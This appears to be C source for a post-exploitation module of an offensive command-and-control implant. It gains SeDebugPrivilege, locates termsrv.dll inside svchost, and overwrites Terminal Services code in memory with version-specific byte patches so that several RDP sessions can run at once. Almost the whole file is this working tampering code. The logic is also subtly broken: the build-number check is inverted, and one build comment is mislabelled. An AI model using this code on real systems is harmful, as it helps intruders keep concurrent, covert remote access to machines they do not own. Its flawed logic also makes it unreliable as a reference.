#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#include "definitions.h"
#include "badger_exports.h"

// TODO: Add credits to original code

typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

typedef struct _MEMORY_SEARCH {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T size;
} MEMORY_SEARCH, *PMEMORY_SEARCH;

typedef struct _PATCH_PATTERN {
    DWORD Length;
    BYTE *Pattern;
} PATCH_PATTERN, *PPATCH_PATTERN;

typedef struct _PATCH_OFFSETS {
    LONG off0;
} PATCH_OFFSETS, *PPATCH_OFFSETS;

typedef struct _PATCH_GENERIC {
    DWORD MinBuildNumber;
    PATCH_PATTERN Search;
    PATCH_PATTERN Patch;
    PATCH_OFFSETS Offsets;
} PATCH_GENERIC, *PPATCH_GENERIC;

typedef struct _dll_info {
    int pid;
    byte * dll_addr;
    int dll_size;
} dll_info;

BYTE PTRN_WN60_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
BYTE PTRN_WN6x_Query__CDefPolicy[] = {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[] = {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_W10_1803_Query__CDefPolicy[] = {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
BYTE PTRN_W10_1809_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_W11_24H2[] = {0x8B, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x75};
BYTE PATC_WN60_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
BYTE PATC_WN6x_Query__CDefPolicy[] = {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_W10_1803_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};
BYTE PATC_W10_1809_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
BYTE PATC_W11_23H2[] = {0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90};
BYTE PATC_W11_24H2[] = {0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90, 0xEB};

BYTE PTRN_WIN5_TestLicence[] = {0x83, 0xf8, 0x02, 0x7f};
BYTE PATC_WIN5_TestLicence[] = {0x90, 0x90};

PATCH_GENERIC TermSrvMultiRdpReferences[] = {
    {2600/*Win XP*/, {sizeof(PTRN_WIN5_TestLicence),PTRN_WIN5_TestLicence},{sizeof(PATC_WIN5_TestLicence), PATC_WIN5_TestLicence},{3}},
    {6000/*VISTA*/, {sizeof(PTRN_WN60_Query__CDefPolicy), PTRN_WN60_Query__CDefPolicy}, {sizeof(PATC_WN60_Query__CDefPolicy), PATC_WN60_Query__CDefPolicy}, {0}},
    {7600/*Win_7*/, {sizeof(PTRN_WN6x_Query__CDefPolicy), PTRN_WN6x_Query__CDefPolicy}, {sizeof(PATC_WN6x_Query__CDefPolicy), PATC_WN6x_Query__CDefPolicy}, {0}},
    {9600/*Win8*/, {sizeof(PTRN_WN81_Query__CDefPolicy),PTRN_WN81_Query__CDefPolicy}, {sizeof(PATC_WN81_Query__CDefPolicy), PATC_WN81_Query__CDefPolicy}, {0}},
    {17134/*Win_10_1803*/, {sizeof(PTRN_W10_1803_Query__CDefPolicy), PTRN_W10_1803_Query__CDefPolicy}, {sizeof(PATC_W10_1803_Query__CDefPolicy), PATC_W10_1803_Query__CDefPolicy}, {0}},
    {17763/*Win_10_1803*/, {sizeof(PTRN_W10_1809_Query__CDefPolicy), PTRN_W10_1809_Query__CDefPolicy}, {sizeof(PATC_W10_1809_Query__CDefPolicy), PATC_W10_1809_Query__CDefPolicy}, {0}},
    {22631/*Win_11_23H2*/, {sizeof(PTRN_W11_24H2), PTRN_W11_24H2}, {sizeof(PATC_W11_23H2), PATC_W11_23H2}, {0}},
    {26100/*Win_11_24H2*/, {sizeof(PTRN_W11_24H2), PTRN_W11_24H2}, {sizeof(PATC_W11_24H2), PATC_W11_24H2}, {0}},
};

BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE *pattern, SIZE_T patternSize, BYTE *patch, SIZE_T patchSize, LONG offset) {
    BYTE *buffer = (BYTE *)BadgerAlloc(region_size);
    if (!buffer) {
        BadgerDispatch(g_dispatch, "[-] Memory allocation failed\n");
        return FALSE;
    }

    BadgerDispatch(g_dispatch, "[*] Pattern to search for: ");
    for (SIZE_T i = 0; i < patternSize; i++) {
        BadgerDispatch(g_dispatch, "%02x ", pattern[i]);
    }
    BadgerDispatch(g_dispatch, "\r\n");

    SIZE_T bytesRead = 0;
    if (!KERNEL32$ReadProcessMemory(hProcess, lpBaseAddress, buffer, region_size, &bytesRead) || bytesRead != region_size) {
        BadgerDispatch(g_dispatch, "[-] Failed to read memory from process\n");
        BadgerFree((PVOID*)&buffer);
        return FALSE;
    }

    BadgerDispatch(g_dispatch, "[*] Read %zu bytes from process\n", bytesRead);

    for (SIZE_T i = 0; i <= region_size - patternSize; i++) {
        if (MSVCRT$memcmp(buffer + i, pattern, patternSize) != 0) {
            continue;
        }

        BadgerDispatch(g_dispatch, "[+] Found pattern in process memory at offset %zu\n", i);

        LPVOID patchAddress = (LPBYTE)lpBaseAddress + i + offset;
        DWORD oldProtect = 0;

        if (!KERNEL32$VirtualProtectEx(hProcess, patchAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            BadgerDispatch(g_dispatch, "[-] Failed to change memory protection\n");
            break;
        }

        BadgerDispatch(g_dispatch, "[+] Patched memory permissions\n");

        SIZE_T bytesWritten = 0;
        BOOL writeResult = KERNEL32$WriteProcessMemory(hProcess, patchAddress, patch, patchSize, &bytesWritten);
        KERNEL32$VirtualProtectEx(hProcess, patchAddress, patchSize, oldProtect, &oldProtect);
        BadgerDispatch(g_dispatch, "[+] Restored memory permissions\n");

        if (!writeResult || bytesWritten != patchSize) {
            BadgerDispatch(g_dispatch, "[-] Failed to write patch to memory\n");
            break;
        }

        BadgerDispatch(g_dispatch, "[+] Patched process memory\n");

        BadgerFree((PVOID*)&buffer);
        return TRUE;
      }

    BadgerFree((PVOID*)&buffer);
    return FALSE;
}


PATCH_GENERIC *GetPatchGenericFromBuild(PATCH_GENERIC *generics, SIZE_T cbGenerics, DWORD buildNumber) {
    PATCH_GENERIC *bestMatch = NULL;
    for (SIZE_T i = 0; i < cbGenerics; i++) {
        if (generics[i].MinBuildNumber <= buildNumber) {
            if (bestMatch == NULL || generics[i].MinBuildNumber > bestMatch->MinBuildNumber) {
                bestMatch = &generics[i];
            }
        }
    }
    return bestMatch;
}


dll_info *get_dll_info(const char *dll_name) {
    dll_info *dll = BadgerAlloc(sizeof(dll_info));
    if (!dll) {
        BadgerDispatch(g_dispatch, "[-] Error allocating memory for dll_info.\n");
        return NULL;
    }

    HANDLE hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        BadgerDispatch(g_dispatch, "[-] Error calling CreateToolhelp32Snapshot.\n");
        return NULL;
    }

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!KERNEL32$Process32First(hProcessSnap, &pe32)) {
        BadgerDispatch(g_dispatch, "[-] Error calling Process32First().\n");
        KERNEL32$CloseHandle(hProcessSnap);
        return NULL;
    }

    do {
        if (BadgerStrcmp("svchost.exe", pe32.szExeFile) != 0) {
            continue;
        }

        HANDLE hModuleSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
        if (hModuleSnap == INVALID_HANDLE_VALUE) {
            BadgerDispatch(g_dispatch, "[-] Error calling CreateToolhelp32Snapshot (%d).\n", pe32.th32ProcessID);
            continue;
        }

        MODULEENTRY32 me32 = {0};
        me32.dwSize = sizeof(MODULEENTRY32);

        if (!KERNEL32$Module32First(hModuleSnap, &me32)) {
            BadgerDispatch(g_dispatch, "[-] Error calling Module32First().\n");
            KERNEL32$CloseHandle(hModuleSnap);
            continue;
        }

        do {
            if (BadgerStrcmp(dll_name, me32.szModule) == 0) {
                dll->pid = (int) pe32.th32ProcessID;
                dll->dll_addr = me32.modBaseAddr;
                dll->dll_size = (int) me32.modBaseSize;
                KERNEL32$CloseHandle(hModuleSnap);
                KERNEL32$CloseHandle(hProcessSnap);
                return dll;
            }
        } while (KERNEL32$Module32Next(hModuleSnap, &me32));

        KERNEL32$CloseHandle(hModuleSnap);

    } while (KERNEL32$Process32Next(hProcessSnap, &pe32));

    KERNEL32$CloseHandle(hProcessSnap);
    return NULL;
}


DWORD GetWindowsBuildNumber() {
    HMODULE hMod = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hMod) {
        return 0;
    }

    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)KERNEL32$GetProcAddress(hMod, "RtlGetVersion");
    if (!pRtlGetVersion) {
        return 0;
    }

    RTL_OSVERSIONINFOW rovi = {0};
    rovi.dwOSVersionInfoSize = sizeof(rovi);

    if (pRtlGetVersion(&rovi) != 0) {
        return 0;
    }

    return rovi.dwBuildNumber;
}


BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleName) {
    DWORD buildNumber = GetWindowsBuildNumber();
    if (buildNumber){
        BadgerDispatch(g_dispatch, "[-] Failed to get build number\n");
        return FALSE;
    }
    
    BadgerDispatch(g_dispatch, "[*] Windows build number: %lu\n", buildNumber);

    PATCH_GENERIC *currentReferences = GetPatchGenericFromBuild(generics, cbGenerics, buildNumber);
    if (!currentReferences) {
        BadgerDispatch(g_dispatch, "[-] No patch references found for build number %lu\n", buildNumber);
        return FALSE;
    }

    BadgerDispatch(g_dispatch, "[*] Found patch references for build number %lu\n", buildNumber);

    dll_info *termsrv = get_dll_info("termsrv.dll");
    if (!termsrv) {
        BadgerDispatch(g_dispatch, "[-] Failed to get termsrv.dll info.\n");
        return FALSE;
    }

    DWORD processId = (DWORD) termsrv->pid;
    BadgerDispatch(g_dispatch, "[+] Found TermService with PID %lu\n", processId);


    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        BadgerDispatch(g_dispatch, "[-] OpenProcess failed with error %lu\n", KERNEL32$GetLastError());
        BadgerFree((PVOID*)&termsrv);
        return FALSE;
    }

    BadgerDispatch(g_dispatch, "[*] Opened process with PID %lu\n", processId);

    LPVOID baseAddress = termsrv->dll_addr;
    SIZE_T imageSize = (SIZE_T) termsrv->dll_size;
    BadgerDispatch(g_dispatch, "[*] Module base address: %p, size: %zu\n", baseAddress, imageSize);

    MEMORY_BASIC_INFORMATION mbi;
    for (LPBYTE address = (LPBYTE)baseAddress; address < (LPBYTE)baseAddress + imageSize; address += mbi.RegionSize) {
        if (KERNEL32$VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != sizeof(mbi)) {
            BadgerDispatch(g_dispatch, "[-] VirtualQueryEx failed at address %p with error %lu\n", address, KERNEL32$GetLastError());
            continue;
        }

        if (mbi.State != MEM_COMMIT) {
            continue;
        }

        if (mbi.Protect != PAGE_EXECUTE_READ && mbi.Protect != PAGE_EXECUTE_READWRITE) {
            continue;
        }

        BadgerDispatch(g_dispatch, "[*] Checking memory region at address %p, size: %zu\n", address, mbi.RegionSize);

        

        if (PatchMemory(
        hProcess,
        address,
        mbi.RegionSize,
        currentReferences->Search.Pattern,
        currentReferences->Search.Length,
        currentReferences->Patch.Pattern,
        currentReferences->Patch.Length,
        currentReferences->Offsets.off0)) {            
            BadgerDispatch(g_dispatch, "[+] \"%ls\" service patched at address %p\n", moduleName, address);
            KERNEL32$CloseHandle(hProcess);
            BadgerFree((PVOID*)&termsrv);
            return TRUE;
        }
    }

    KERNEL32$CloseHandle(hProcess);
    BadgerFree((PVOID*)&termsrv);
    return FALSE;
}

void printHelp(){
	BadgerDispatch(g_dispatch, "[*] Usage: multi_rdp.o\n");
}

void coffee(char ** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;

    // Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

    if (!BadgerAddPrivilege(SE_DEBUG_NAME)) {
        BadgerDispatch(g_dispatch, "[-] Failed to activate SeDebugPrivilege\n");
        return;
    }

    if (!PatchTermService(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"termsrv.dll")) {
        BadgerDispatch(g_dispatch, "[-] Failed to patch service\n");
    }
}

